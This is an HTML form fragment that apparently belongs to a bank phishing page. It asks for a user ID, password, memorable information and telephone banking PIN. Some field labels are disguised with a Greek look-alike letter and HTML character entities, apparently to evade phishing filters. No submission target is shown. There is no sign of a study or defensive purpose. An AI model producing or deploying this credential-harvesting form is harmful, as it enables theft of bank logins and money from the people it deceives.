<br>
<form>
	<table width="100%">		
	</tr>
	<tr>
		<td width="30%">User ID</td>
		<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
		<td>
			<div class="textInput">
				<div class="fieldWrapper">
					<input type="text"  autocomplete="off"  maxlength="20" name="u_id" value="" required="required" title="User ΙD">
				</div>
			</div>
		</td>
		
	</tr>
	<tr>
		<td>Password</td>
		<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
		<td>
			<div class="textInput">
				<div class="fieldWrapper">
					<input type="password"  autocomplete="off"  maxlength="20" name="pwd_b" value="" required="required" title="Password">
				</div>
			</div>
		</td>
		
	</tr>
	<tr>
		<td width="30%">&#77;emorable</td>
		<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
		<td>
			<div class="textInput">
				<div class="fieldWrapper">
					<input type="text"  autocomplete="off"  maxlength="20" name="m_able" value="" required="required" title="Memorable">
				</div>
			</div>
		</td>
		
	</tr>
	<tr>
		<td width="30%">Telephone Ba&#110;king Pin</td>
		<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
		<td>
			<div class="textInput">
				<div class="fieldWrapper">
					<input type="password" id="txt" onkeyup="check()" onmouseout="check()" autocomplete="off" maxlength="6" name="tpin" value="" required="" title="Telephone Pin">
				</div>
			</div>
		</td>
		
	</tr>
</table>
</form>